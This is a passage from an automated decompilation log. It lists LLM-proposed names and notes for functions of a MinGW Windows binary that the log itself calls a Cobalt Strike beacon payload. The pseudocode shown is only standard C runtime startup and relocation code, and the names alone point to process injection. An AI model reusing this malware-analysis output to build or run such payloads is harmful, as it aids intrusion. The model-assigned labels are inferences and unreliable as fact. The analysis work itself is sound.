puVar3 = (ulonglong *)(the_secs + 0x18);\n  do {\n    if ((*puVar3 <= param_1) && (param_1 < *puVar3 + (ulonglong)*(uint *)(puVar3[1] + 8))) {\n      return;\n    }\n    tmp_uVar9 = tmp_uVar9 + 1;\n    puVar3 = puVar3 + 5;\n  } while (tmp_uVar9 != maxSections);\n  do {\n    tmp_lVar4 = __mingw_GetSectionForAddress(param_1);\n    if (tmp_lVar4 == 0) {\nLAB_140001ca2:\n      _text(\"Address %p has no image-section\",param_1);\n      if (was_init_0 == 0) {\n        was_init_0 = 1;\n        uStack_a0 = param_1;\n        uStack_98 = tmp_uVar7;\n        lStack_90 = tmp_lVar4;\n        tmp_iVar1 = __mingw_GetSectionCount();\n        maxSections = 0;\n        the_secs = auStack_b0 + -((longlong)tmp_iVar1 * 0x28 + 0xfU & -16);\n      }\n      return;\n    }\n    param_1 = tmp_uVar7 * 0x28;\n    puVar5 = (undefined4 *)(the_secs + param_1);\n    *(longlong *)(puVar5 + 8) = tmp_lVar4;\n    *puVar5 = 0;\n    tmp_lVar6 = _GetPEImageBase();\n    tmp_lVar6 = tmp_lVar6 + (ulonglong)*(uint *)(tmp_lVar4 + 0xc);\n    *(longlong *)(the_secs + 0x18 + param_1) = tmp_lVar6;\n    tmp_lVar6 = VirtualQuery(tmp_lVar6,local_48,0x30);\n    if (tmp_lVar6 == 0) {\n      _text(\"  VirtualQuery failed for %d bytes at address %p\",*(undefined4 *)(tmp_lVar4 + 8),\n            *(undefined8 *)(the_secs + 0x18 + param_1));\n      goto LAB_140001ca2;\n    }\n    if (((local_24 - 4U & -5) == 0) || ((local_24 - 0x40U & -65) == 0)) {\nLAB_140001c1e:\n      maxSections = maxSections + 1;\n      return;\n    }\n    tmp_uVar8 = 0x40;\n    if (local_24 == 2) {\n      tmp_uVar8 = 4;\n    }\n    param_1 = param_1 + (longlong)the_secs;\n    *(undefined8 *)(param_1 + 8) = local_48[0];\n    *(undefined8 *)(param_1 + 0x10) = local_30;\n    tmp_iVar1 = VirtualProtect(local_48[0],local_30,tmp_uVar8,param_1);\n    if (tmp_iVar1 != 0) goto LAB_140001c1e;\n    tmp_uVar2 = GetLastError();\n    _text(\"  VirtualProtect failed with code 0x%x\",tmp_uVar2);\nLAB_140001c80:\n    tmp_uVar7 = 0;\n  } while( true );\n}\n",
+        "raw_pseudocode": "\n/* WARNING: Function: ___chkstk_ms replaced with injection: alloca_probe */\n/* WARNING: Removing unreachable block (ram,0x000140001d49) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec0) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec8) */\n/* WARNING: Removing unreachable block (ram,0x00014000202b) */\n/* WARNING: Removing unreachable block (ram,0x000140002036) */\n/* WARNING: Removing unreachable block (ram,0x000140001d53) */\n/* WARNING: Removing unreachable block (ram,0x000140001d5d) */\n/* WARNING: Removing unreachable block (ram,0x000140001ed5) */\n/* WARNING: Removing unreachable block (ram,0x000140001ede) */\n/* WARNING: Removing unreachable block (ram,0x000140001ef0) */\n/* WARNING: Removing unreachable block (ram,0x000140001f20) */\n/* WARNING: Removing unreachable block (ram,0x000140001d68) */\n/* WARNING: Removing unreachable block (ram,0x000140001d74) */\n/* WARNING: Removing unreachable block (ram,0x000140001d84) */\n/* WARNING: Removing unreachable block (ram,0x000140001dfd) */\n/* WARNING: Removing unreachable block (ram,0x000140001f80) */\n/* WARNING: Removing unreachable block (ram,0x000140001f8b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e19) */\n/* WARNING: Removing unreachable block (ram,0x000140001d90) */\n/* WARNING: Removing unreachable block (ram,0x000140001f28) */\n/* WARNING: Removing unreachable block (ram,0x000140002020) */\n/* WARNING: Removing unreachable block (ram,0x000140001f34) */\n/* WARNING: Removing unreachable block (ram,0x000140001f40) */\n/* WARNING: Removing unreachable block (ram,0x000140001f4e) */\n/* WARNING: Removing unreachable block (ram,0x000140001f5a) */\n/* WARNING: Removing unreachable block (ram,0x000140001d99) */\n/* WARNING: Removing unreachable block (ram,0x000140001da2) */\n/* WARNING: Removing unreachable block (ram,0x000140001fe0) */\n/* WARNING: Removing unreachable block (ram,0x000140001daf) */\n/* WARNING: Removing unreachable block (ram,0x000140001dcb) */\n/* WARNING: Removing unreachable block (ram,0x000140001dd7) */\n/* WARNING: Removing unreachable block (ram,0x000140001ff6) */\n/* WARNING: Removing unreachable block (ram,0x000140002010) */\n/* WARNING: Removing unreachable block (ram,0x000140001f9e) */\n/* WARNING: Removing unreachable block (ram,0x000140001fac) */\n/* WARNING: Removing unreachable block (ram,0x000140001fb4) */\n/* WARNING: Removing unreachable block (ram,0x000140001df4) */\n/* WARNING: Removing unreachable block (ram,0x000140001e1f) */\n/* WARNING: Removing unreachable block (ram,0x00014000203f) */\n/* WARNING: Removing unreachable block (ram,0x000140002053) */\n/* WARNING: Removing unreachable block (ram,0x000140002070) */\n/* WARNING: Removing unreachable block (ram,0x000140002099) */\n/* WARNING: Removing unreachable block (ram,0x000140001e28) */\n/* WARNING: Removing unreachable block (ram,0x000140001e5b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e60) */\n/* WARNING: Removing unreachable block (ram,0x000140001e6e) */\n/* WARNING: Removing unreachable block (ram,0x000140001e80) */\n/* WARNING: Removing unreachable block (ram,0x000140001e92) */\n/* WARNING: Removing unreachable block (ram,0x000140001e9f) */\n/* WARNING: Removing unreachable block (ram,0x000140001eae) */\n/* WARNING: Type propagation algorithm not settling */\n\nvoid mark_section_writable(ulonglong param_1)\n\n{\n  int iVar1;\n  undefined4 uVar2;\n  ulonglong *puVar3;\n  longlong lVar4;\n  undefined4 *puVar5;\n  longlong lVar6;\n  ulonglong uVar7;\n  undefined8 uVar8;\n  uint uVar9;\n  undefined1 auStack_b0 [16];\n  ulonglong uStack_a0;\n  ulonglong uStack_98;\n  longlong lStack_90;\n  undefined8 local_48 [3];\n  undefined8 local_30;\n  int local_24;\n  \n  uVar7 = (ulonglong)maxSections;\n  if ((int)maxSections < 1) goto LAB_140001c80;\n  uVar9 = 0;\n  puVar3 = (ulonglong *)(the_secs + 0x18);\n  do {\n    if ((*puVar3 <= param_1) && (param_1 < *puVar3 + (ulonglong)*(uint *)(puVar3[1] + 8))) {\n      return;\n    }\n    uVar9 = uVar9 + 1;\n    puVar3 = puVar3 + 5;\n  } while (uVar9 != maxSections);\n  do {\n    lVar4 = __mingw_GetSectionForAddress(param_1);\n    if (lVar4 == 0) {\nLAB_140001ca2:\n      _text(\"Address %p has no image-section\",param_1);\n      if (was_init_0 == 0) {\n        was_init_0 = 1;\n        uStack_a0 = param_1;\n        uStack_98 = uVar7;\n        lStack_90 = lVar4;\n        iVar1 = __mingw_GetSectionCount();\n        maxSections = 0;\n        the_secs = auStack_b0 + -((longlong)iVar1 * 0x28 + 0xfU & 0xfffffffffffffff0);\n      }\n      return;\n    }\n    param_1 = uVar7 * 0x28;\n    puVar5 = (undefined4 *)(the_secs + param_1);\n    *(longlong *)(puVar5 + 8) = lVar4;\n    *puVar5 = 0;\n    lVar6 = _GetPEImageBase();\n    lVar6 = lVar6 + (ulonglong)*(uint *)(lVar4 + 0xc);\n    *(longlong *)(the_secs + 0x18 + param_1) = lVar6;\n    lVar6 = VirtualQuery(lVar6,local_48,0x30);\n    if (lVar6 == 0) {\n      _text(\"  VirtualQuery failed for %d bytes at address %p\",*(undefined4 *)(lVar4 + 8),\n            *(undefined8 *)(the_secs + 0x18 + param_1));\n      goto LAB_140001ca2;\n    }\n    if (((local_24 - 4U & 0xfffffffb) == 0) || ((local_24 - 0x40U & 0xffffffbf) == 0)) {\nLAB_140001c1e:\n      maxSections = maxSections + 1;\n      return;\n    }\n    uVar8 = 0x40;\n    if (local_24 == 2) {\n      uVar8 = 4;\n    }\n    param_1 = param_1 + (longlong)the_secs;\n    *(undefined8 *)(param_1 + 8) = local_48[0];\n    *(undefined8 *)(param_1 + 0x10) = local_30;\n    iVar1 = VirtualProtect(local_48[0],local_30,uVar8,param_1);\n    if (iVar1 != 0) goto LAB_140001c1e;\n    uVar2 = GetLastError();\n    _text(\"  VirtualProtect failed with code 0x%x\",uVar2);\nLAB_140001c80:\n    uVar7 = 0;\n  } while( true );\n}\n\n"
+      },
+      {
+        "function_address": "5368716480",
+        "function_name": "_pei386_runtime_relocator",
+        "confidence": 0.95,
+        "parameters": [],
+        "return_type": "void",
+        "notes": "One-time initialization routine for the MinGW PE i386 runtime pseudo-relocator, invoked during C runtime startup (caller: __tmainCRTStartup). It retrieves the PE section count via __mingw_GetSectionCount, allocates a stack buffer for section metadata, and sets a one-time initialization flag to prevent re-execution. The associated pseudo-relocation range error string confirms this function is part of the PE relocation handling subsystem.",
+        "behavior_tags": [
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 6626,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-98592c5927e78082c2b34f64d78e4cd2.019fdf3ab55177b5b8a7a91e361f8783",
+          "system_fingerprint": null,
+          "prompt_tokens": 2039,
+          "completion_tokens": 1766,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\n/* WARNING: Function: ___chkstk_ms replaced with injection: alloca_probe */\n/* WARNING: Removing unreachable block (ram,0x000140001d49) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec0) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec8) */\n/* WARNING: Removing unreachable block (ram,0x00014000202b) */\n/* WARNING: Removing unreachable block (ram,0x000140002036) */\n/* WARNING: Removing unreachable block (ram,0x000140001d53) */\n/* WARNING: Removing unreachable block (ram,0x000140001d5d) */\n/* WARNING: Removing unreachable block (ram,0x000140001ed5) */\n/* WARNING: Removing unreachable block (ram,0x000140001ede) */\n/* WARNING: Removing unreachable block (ram,0x000140001ef0) */\n/* WARNING: Removing unreachable block (ram,0x000140001f20) */\n/* WARNING: Removing unreachable block (ram,0x000140001d68) */\n/* WARNING: Removing unreachable block (ram,0x000140001d74) */\n/* WARNING: Removing unreachable block (ram,0x000140001d84) */\n/* WARNING: Removing unreachable block (ram,0x000140001dfd) */\n/* WARNING: Removing unreachable block (ram,0x000140001f80) */\n/* WARNING: Removing unreachable block (ram,0x000140001f8b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e19) */\n/* WARNING: Removing unreachable block (ram,0x000140001d90) */\n/* WARNING: Removing unreachable block (ram,0x000140001f28) */\n/* WARNING: Removing unreachable block (ram,0x000140002020) */\n/* WARNING: Removing unreachable block (ram,0x000140001f34) */\n/* WARNING: Removing unreachable block (ram,0x000140001f40) */\n/* WARNING: Removing unreachable block (ram,0x000140001f4e) */\n/* WARNING: Removing unreachable block (ram,0x000140001f5a) */\n/* WARNING: Removing unreachable block (ram,0x000140001d99) */\n/* WARNING: Removing unreachable block (ram,0x000140001da2) */\n/* WARNING: Removing unreachable block (ram,0x000140001fe0) */\n/* WARNING: Removing unreachable block (ram,0x000140001daf) */\n/* WARNING: Removing unreachable block (ram,0x000140001dcb) */\n/* WARNING: Removing unreachable block (ram,0x000140001dd7) */\n/* WARNING: Removing unreachable block (ram,0x000140001ff6) */\n/* WARNING: Removing unreachable block (ram,0x000140002010) */\n/* WARNING: Removing unreachable block (ram,0x000140001f9e) */\n/* WARNING: Removing unreachable block (ram,0x000140001fac) */\n/* WARNING: Removing unreachable block (ram,0x000140001fb4) */\n/* WARNING: Removing unreachable block (ram,0x000140001df4) */\n/* WARNING: Removing unreachable block (ram,0x000140001e1f) */\n/* WARNING: Removing unreachable block (ram,0x00014000203f) */\n/* WARNING: Removing unreachable block (ram,0x000140002053) */\n/* WARNING: Removing unreachable block (ram,0x000140002070) */\n/* WARNING: Removing unreachable block (ram,0x000140002099) */\n/* WARNING: Removing unreachable block (ram,0x000140001e28) */\n/* WARNING: Removing unreachable block (ram,0x000140001e5b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e60) */\n/* WARNING: Removing unreachable block (ram,0x000140001e6e) */\n/* WARNING: Removing unreachable block (ram,0x000140001e80) */\n/* WARNING: Removing unreachable block (ram,0x000140001e92) */\n/* WARNING: Removing unreachable block (ram,0x000140001e9f) */\n/* WARNING: Removing unreachable block (ram,0x000140001eae) */\n\nvoid _pei386_runtime_relocator(void)\n\n{\n  int tmp_iVar1;\n  undefined1 auStack_48 [16];\n  \n  if (was_init_0 == 0) {\n    was_init_0 = 1;\n    tmp_iVar1 = __mingw_GetSectionCount();\n    maxSections = 0;\n    the_secs = auStack_48 + -((longlong)tmp_iVar1 * 0x28 + 0xfU & -16);\n  }\n  return;\n}\n",
+        "raw_pseudocode": "\n/* WARNING: Function: ___chkstk_ms replaced with injection: alloca_probe */\n/* WARNING: Removing unreachable block (ram,0x000140001d49) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec0) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec8) */\n/* WARNING: Removing unreachable block (ram,0x00014000202b) */\n/* WARNING: Removing unreachable block (ram,0x000140002036) */\n/* WARNING: Removing unreachable block (ram,0x000140001d53) */\n/* WARNING: Removing unreachable block (ram,0x000140001d5d) */\n/* WARNING: Removing unreachable block (ram,0x000140001ed5) */\n/* WARNING: Removing unreachable block (ram,0x000140001ede) */\n/* WARNING: Removing unreachable block (ram,0x000140001ef0) */\n/* WARNING: Removing unreachable block (ram,0x000140001f20) */\n/* WARNING: Removing unreachable block (ram,0x000140001d68) */\n/* WARNING: Removing unreachable block (ram,0x000140001d74) */\n/* WARNING: Removing unreachable block (ram,0x000140001d84) */\n/* WARNING: Removing unreachable block (ram,0x000140001dfd) */\n/* WARNING: Removing unreachable block (ram,0x000140001f80) */\n/* WARNING: Removing unreachable block (ram,0x000140001f8b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e19) */\n/* WARNING: Removing unreachable block (ram,0x000140001d90) */\n/* WARNING: Removing unreachable block (ram,0x000140001f28) */\n/* WARNING: Removing unreachable block (ram,0x000140002020) */\n/* WARNING: Removing unreachable block (ram,0x000140001f34) */\n/* WARNING: Removing unreachable block (ram,0x000140001f40) */\n/* WARNING: Removing unreachable block (ram,0x000140001f4e) */\n/* WARNING: Removing unreachable block (ram,0x000140001f5a) */\n/* WARNING: Removing unreachable block (ram,0x000140001d99) */\n/* WARNING: Removing unreachable block (ram,0x000140001da2) */\n/* WARNING: Removing unreachable block (ram,0x000140001fe0) */\n/* WARNING: Removing unreachable block (ram,0x000140001daf) */\n/* WARNING: Removing unreachable block (ram,0x000140001dcb) */\n/* WARNING: Removing unreachable block (ram,0x000140001dd7) */\n/* WARNING: Removing unreachable block (ram,0x000140001ff6) */\n/* WARNING: Removing unreachable block (ram,0x000140002010) */\n/* WARNING: Removing unreachable block (ram,0x000140001f9e) */\n/* WARNING: Removing unreachable block (ram,0x000140001fac) */\n/* WARNING: Removing unreachable block (ram,0x000140001fb4) */\n/* WARNING: Removing unreachable block (ram,0x000140001df4) */\n/* WARNING: Removing unreachable block (ram,0x000140001e1f) */\n/* WARNING: Removing unreachable block (ram,0x00014000203f) */\n/* WARNING: Removing unreachable block (ram,0x000140002053) */\n/* WARNING: Removing unreachable block (ram,0x000140002070) */\n/* WARNING: Removing unreachable block (ram,0x000140002099) */\n/* WARNING: Removing unreachable block (ram,0x000140001e28) */\n/* WARNING: Removing unreachable block (ram,0x000140001e5b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e60) */\n/* WARNING: Removing unreachable block (ram,0x000140001e6e) */\n/* WARNING: Removing unreachable block (ram,0x000140001e80) */\n/* WARNING: Removing unreachable block (ram,0x000140001e92) */\n/* WARNING: Removing unreachable block (ram,0x000140001e9f) */\n/* WARNING: Removing unreachable block (ram,0x000140001eae) */\n\nvoid _pei386_runtime_relocator(void)\n\n{\n  int iVar1;\n  undefined1 auStack_48 [16];\n  \n  if (was_init_0 == 0) {\n    was_init_0 = 1;\n    iVar1 = __mingw_GetSectionCount();\n    maxSections = 0;\n    the_secs = auStack_48 + -((longlong)iVar1 * 0x28 + 0xfU & 0xfffffffffffffff0);\n  }\n  return;\n}\n\n"
+      },
+      {
+        "function_address": "5368713280",
+        "function_name": "__tmainCRTStartup",
+        "confidence": 0.95,
+        "parameters": [],
+        "return_type": "int",
+        "notes": "Standard MinGW C runtime startup routine for console applications using wide-character main (tmain). It initializes the C runtime environment, processes thread-local storage callbacks, parses command-line arguments, invokes the Cobalt Strike beacon's main function (cobalt_beacon_main at 0x1400025a0), and performs runtime cleanup before exiting. The function is called by standard CRT entry points WinMainCRTStartup and mainCRTStartup, confirming its role as the primary console application entry point for this MinGW-compiled payload.",
+        "behavior_tags": [
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 7473,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-b9ccc613d9de8e1e577383d8391f9389.019fdf3af0b17f2a85c6e21b35060f24",
+          "system_fingerprint": null,
+          "prompt_tokens": 2318,
+          "completion_tokens": 8455,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\n/* WARNING: Removing unreachable block (ram,0x0001400013f5) */\n/* WARNING: Removing unreachable block (ram,0x0001400013ff) */\n\nulonglong __tmainCRTStartup(void)\n\n{\n  longlong tmp_lVar1;\n  uint tmp_uVar2;\n  longlong tmp_lVar3;\n  int tmp_iVar4;\n  size_t sVar5;\n  longlong tmp_lVar6;\n  undefined8 *puVar7;\n  ulonglong tmp_uVar8;\n  FILE *__stream;\n  undefined4 *puVar9;\n  undefined8 *puVar10;\n  void *__dest;\n  undefined8 *puVar11;\n  ulonglong tmp_uVar12;\n  longlong unaff_GS_OFFSET;\n  bool tmp_bVar13;\n  undefined4 local_4c [3];\n  \n  tmp_lVar1 = *(longlong *)(*(longlong *)(unaff_GS_OFFSET + 0x30) + 8);\n  while( true ) {\n    tmp_lVar6 = 0;\n    LOCK();\n    tmp_bVar13 = __native_startup_lock == 0;\n    tmp_lVar3 = tmp_lVar1;\n    if (!tmp_bVar13) {\n      tmp_lVar6 = __native_startup_lock;\n      tmp_lVar3 = __native_startup_lock;\n    }\n    __native_startup_lock = tmp_lVar3;\n    UNLOCK();\n    if (tmp_bVar13) {\n      tmp_bVar13 = false;\n      goto LAB_14000108c;\n    }\n    if (tmp_lVar1 == tmp_lVar6) break;\n    Sleep(1000);\n  }\n  tmp_bVar13 = true;\nLAB_14000108c:\n  if (__native_startup_state != 1) {\n    if (__native_startup_state == 0) {\n      __native_startup_state = 1;\n      __stream = (FILE *)__acrt_iob_func(2);\n      setvbuf(__stream,(char *)0x0,4,0);\n      tmp_iVar4 = _crt_atexit(safe_flush);\n      if (tmp_iVar4 == 0) {\n        _pei386_runtime_relocator();\n        _set_invalid_parameter_handler(FUN_140001000);\n        _text();\n        __mingw_initltsdrot_force = 1;\n        __mingw_initltsdyn_force = 1;\n        __mingw_initltssuo_force = 1;\n        managedapp = 0;\n        if (__mingw_app_type != 0) goto LAB_140001378;\n        __set_app_type(1);\n        do {\n          puVar9 = (undefined4 *)__p__fmode();\n          *puVar9 = _fmode;\n          puVar9 = (undefined4 *)__p__commode();\n          *puVar9 = _commode;\n          tmp_iVar4 = _text();\n          if (-1 < tmp_iVar4) {\n            if (_MINGW_INSTALL_DEBUG_MATHERR == 1) {\n              __mingw_setusermatherr(_text);\n            }\n            if (__globallocalestatus == -1) {\n              _configthreadlocale(-1);\n            }\n            tmp_iVar4 = _initterm_e(&__xi_a,&__xi_z);\n            if (tmp_iVar4 != 0) goto LAB_140001419;\n            local_4c[0] = _newmode;\n            tmp_iVar4 = __getmainargs(&argc,&argv,&envp,_dowildcard,local_4c);\n            tmp_uVar2 = argc;\n            if (-1 < tmp_iVar4) {\n              tmp_uVar8 = (ulonglong)argc;\n              puVar10 = malloc((argc + 1) * 8);\n              puVar7 = argv;\n              if (puVar10 != (undefined8 *)0x0) {\n                puVar11 = puVar10;\n                if ((int)tmp_uVar2 < 1) {\nLAB_140001395:\n                  *puVar11 = 0;\n                  argv = puVar10;\n                  SetUnhandledExceptionFilter(cpp_unhandled_exception_filter);\n                  _initterm(&__xc_a,&__xc_z);\n                  __main();\n                  __native_startup_state = 2;\n                  goto LAB_1400010b5;\n                }\n                tmp_uVar12 = 1;\n                while( true ) {\n                  sVar5 = strlen((char *)puVar7[tmp_uVar12 - 1]);\n                  __dest = malloc(sVar5 + 1);\n                  puVar10[tmp_uVar12 - 1] = __dest;\n                  if (__dest == (void *)0x0) break;\n                  memcpy(__dest,(void *)puVar7[tmp_uVar12 - 1],sVar5 + 1);\n                  if (tmp_uVar8 == tmp_uVar12) {\n                    puVar11 = puVar10 + tmp_uVar8;\n                    goto LAB_140001395;\n                  }\n                  tmp_uVar12 = tmp_uVar12 + 1;\n                }\n              }\n            }\n          }\n          _amsg_exit(8);\nLAB_140001378:\n          __set_app_type(2);\n        } while( true );\n      }\n      abort();\nLAB_140001419:\n      tmp_uVar8 = _amsg_exit(10);\n    }\n    else {\n      has_cctor = 1;\nLAB_1400010b5:\n      if (!tmp_bVar13) {\n        LOCK();\n        __native_startup_lock = 0;\n        UNLOCK();\n      }\n      tls_callback_0(0,2,0);\n      puVar7 = (undefined8 *)__p___initenv();\n      tmp_uVar2 = argc;\n      *puVar7 = envp;\n      tmp_uVar8 = main(tmp_uVar2,argv);\n      if (managedapp != 0) {\n        if (has_cctor == 0) {\n          _cexit();\n          tmp_uVar8 = tmp_uVar8 & -1;\n        }\n        return tmp_uVar8;\n      }\n    }\n    exit((int)tmp_uVar8);\n  }\n  _amsg_exit(0x1f);\n  __mingw_app_type = 1;\n  tmp_uVar8 = __tmainCRTStartup();\n  return tmp_uVar8;\n}\n",
+        "raw_pseudocode": "\n/* WARNING: Removing unreachable block (ram,0x0001400013f5) */\n/* WARNING: Removing unreachable block (ram,0x0001400013ff) */\n\nulonglong __tmainCRTStartup(void)\n\n{\n  longlong lVar1;\n  uint uVar2;\n  longlong lVar3;\n  int iVar4;\n  size_t sVar5;\n  longlong lVar6;\n  undefined8 *puVar7;\n  ulonglong uVar8;\n  FILE *__stream;\n  undefined4 *puVar9;\n  undefined8 *puVar10;\n  void *__dest;\n  undefined8 *puVar11;\n  ulonglong uVar12;\n  longlong unaff_GS_OFFSET;\n  bool bVar13;\n  undefined4 local_4c [3];\n  \n  lVar1 = *(longlong *)(*(longlong *)(unaff_GS_OFFSET + 0x30) + 8);\n  while( true ) {\n    lVar6 = 0;\n    LOCK();\n    bVar13 = __native_startup_lock == 0;\n    lVar3 = lVar1;\n    if (!bVar13) {\n      lVar6 = __native_startup_lock;\n      lVar3 = __native_startup_lock;\n    }\n    __native_startup_lock = lVar3;\n    UNLOCK();\n    if (bVar13) {\n      bVar13 = false;\n      goto LAB_14000108c;\n    }\n    if (lVar1 == lVar6) break;\n    Sleep(1000);\n  }\n  bVar13 = true;\nLAB_14000108c:\n  if (__native_startup_state != 1) {\n    if (__native_startup_state == 0) {\n      __native_startup_state = 1;\n      __stream = (FILE *)__acrt_iob_func(2);\n      setvbuf(__stream,(char *)0x0,4,0);\n      iVar4 = _crt_atexit(safe_flush);\n      if (iVar4 == 0) {\n        _pei386_runtime_relocator();\n        _set_invalid_parameter_handler(FUN_140001000);\n        _text();\n        __mingw_initltsdrot_force = 1;\n        __mingw_initltsdyn_force = 1;\n        __mingw_initltssuo_force = 1;\n        managedapp = 0;\n        if (__mingw_app_type != 0) goto LAB_140001378;\n        __set_app_type(1);\n        do {\n          puVar9 = (undefined4 *)__p__fmode();\n          *puVar9 = _fmode;\n          puVar9 = (undefined4 *)__p__commode();\n          *puVar9 = _commode;\n          iVar4 = _text();\n          if (-1 < iVar4) {\n            if (_MINGW_INSTALL_DEBUG_MATHERR == 1) {\n              __mingw_setusermatherr(_text);\n            }\n            if (__globallocalestatus == -1) {\n              _configthreadlocale(0xffffffff);\n            }\n            iVar4 = _initterm_e(&__xi_a,&__xi_z);\n            if (iVar4 != 0) goto LAB_140001419;\n            local_4c[0] = _newmode;\n            iVar4 = __getmainargs(&argc,&argv,&envp,_dowildcard,local_4c);\n            uVar2 = argc;\n            if (-1 < iVar4) {\n              uVar8 = (ulonglong)argc;\n              puVar10 = malloc((argc + 1) * 8);\n              puVar7 = argv;\n              if (puVar10 != (undefined8 *)0x0) {\n                puVar11 = puVar10;\n                if ((int)uVar2 < 1) {\nLAB_140001395:\n                  *puVar11 = 0;\n                  argv = puVar10;\n                  SetUnhandledExceptionFilter(cpp_unhandled_exception_filter);\n                  _initterm(&__xc_a,&__xc_z);\n                  __main();\n                  __native_startup_state = 2;\n                  goto LAB_1400010b5;\n                }\n                uVar12 = 1;\n                while( true ) {\n                  sVar5 = strlen((char *)puVar7[uVar12 - 1]);\n                  __dest = malloc(sVar5 + 1);\n                  puVar10[uVar12 - 1] = __dest;\n                  if (__dest == (void *)0x0) break;\n                  memcpy(__dest,(void *)puVar7[uVar12 - 1],sVar5 + 1);\n                  if (uVar8 == uVar12) {\n                    puVar11 = puVar10 + uVar8;\n                    goto LAB_140001395;\n                  }\n                  uVar12 = uVar12 + 1;\n                }\n              }\n            }\n          }\n          _amsg_exit(8);\nLAB_140001378:\n          __set_app_type(2);\n        } while( true );\n      }\n      abort();\nLAB_140001419:\n      uVar8 = _amsg_exit(10);\n    }\n    else {\n      has_cctor = 1;\nLAB_1400010b5:\n      if (!bVar13) {\n        LOCK();\n        __native_startup_lock = 0;\n        UNLOCK();\n      }\n      tls_callback_0(0,2,0);\n      puVar7 = (undefined8 *)__p___initenv();\n      uVar2 = argc;\n      *puVar7 = envp;\n      uVar8 = main(uVar2,argv);\n      if (managedapp != 0) {\n        if (has_cctor == 0) {\n          _cexit();\n          uVar8 = uVar8 & 0xffffffff;\n        }\n        return uVar8;\n      }\n    }\n    exit((int)uVar8);\n  }\n  _amsg_exit(0x1f);\n  __mingw_app_type = 1;\n  uVar8 = __tmainCRTStartup();\n  return uVar8;\n}\n\n"
+      },
+      {
+        "function_address": "5368714304",
+        "function_name": "win_main_crt_startup",
+        "confidence": 0.95,
+        "parameters": [],
+        "return_type": "void",
+        "notes": "Standard MinGW GUI application C runtime startup entry point. Sets the global __mingw_app_type to 1 to mark the process as a Windows subsystem (GUI) application, then calls __tmainCRTStartup to perform standard CRT initialization prior to invoking the application's WinMain function, which is present as a neighbor in the same address space.",
+        "behavior_tags": [
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 2719,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-8fbf513a4af6590a5e92a1e61b7fcc90.019fdf3bd8f7723494ebce32043d0be5",
+          "system_fingerprint": null,
+          "prompt_tokens": 784,
+          "completion_tokens": 1224,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\nvoid WinMainCRTStartup(void)\n\n{\n  __mingw_app_type = 1;\n  __tmainCRTStartup();\n  return;\n}\n",
+        "raw_pseudocode": "\nvoid WinMainCRTStartup(void)\n\n{\n  __mingw_app_type = 1;\n  __tmainCRTStartup();\n  return;\n}\n\n"
+      },
+      {
+        "function_address": "5368714336",
+        "function_name": "main_crt_startup",
+        "confidence": 0.95,
+        "parameters": [],
+        "return_type": "void",
+        "notes": "Standard MinGW C runtime startup entry point for console applications. It sets the global __mingw_app_type to 0 to indicate a console application type, then delegates to the resolved internal __tmainCRTStartup function which handles standard CRT initialization and invokes the program's main entry point.",
+        "behavior_tags": [
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 2716,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-abfbdde7b9e503ab53cbc452f7c47fd8.019fdf3bd8c87e3f86477813cccfd459",
+          "system_fingerprint": null,
+          "prompt_tokens": 783,
+          "completion_tokens": 1112,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\nvoid mainCRTStartup(void)\n\n{\n  __mingw_app_type = 0;\n  __tmainCRTStartup();\n  return;\n}\n",
+        "raw_pseudocode": "\nvoid mainCRTStartup(void)\n\n{\n  __mingw_app_type = 0;\n  __tmainCRTStartup();\n  return;\n}\n\n"
+      }
+    ],
+    "unified_names": {
+      "_find_pe_section_by_name": [
+        "5368718448"
+      ],
+      "find_process_id": [
+        "5368714416"
+      ],
+      "___w64_mingwthr_add_key_dtor": [
+        "5368717712"
+      ],
+      "_is_nonwritable_in_current_image": [
+        "5368718944"
+      ],
+      "enum_import_library_names": [
+        "5368719088"
+      ],
+      "_matherr": [
+        "5368715760"
+      ],
+      "__mingw_tls_callback": [
+        "5368718032"
+      ],
+      "cobalt_beacon_inject_and_cleanup": [
+        "5368714576"
+      ],
+      "_amsg_exit": [
+        "5368719616"
+      ],
+      "__mingw_mark_section_writable": [
+        "5368716016"
+      ],
+      "mingw_tls_process_attach_callback": [
+        "5368715616"
+      ],
+      "min_gw_tls_callback_wrapper": [
+        "5368715584"
+      ],
+      "cobalt_beacon_main": [
+        "5368720352"
+      ],
+      "ensure_target_section_writable": [
+        "5368716112"
+      ],
+      "_pei386_runtime_relocator": [
+        "5368716480"
+      ],
+      "__tmainCRTStartup": [
+        "5368713280"
+      ],
+      "win_main_crt_startup": [
+        "5368714304"
+      ],
+      "main_crt_startup": [
+        "5368714336"
+      ]
+    },
+    "proposed_structs": [],
+    "conflict_count": 0
+  },
+  "writeback": {
+    "dry_run": false,
+    "applied": [],
+    "skipped": [],
+    "errors": [
+      {
+        "address": "5368718448",
+        "name": "_find_pe_section_by_name",
+        "error": "only SELECT queries are allowed"
+      },
+      {
+        "address": "5368714416",
+        "name": "find_process_id",
+        "error": "only SELECT queries are allowed"
+      },
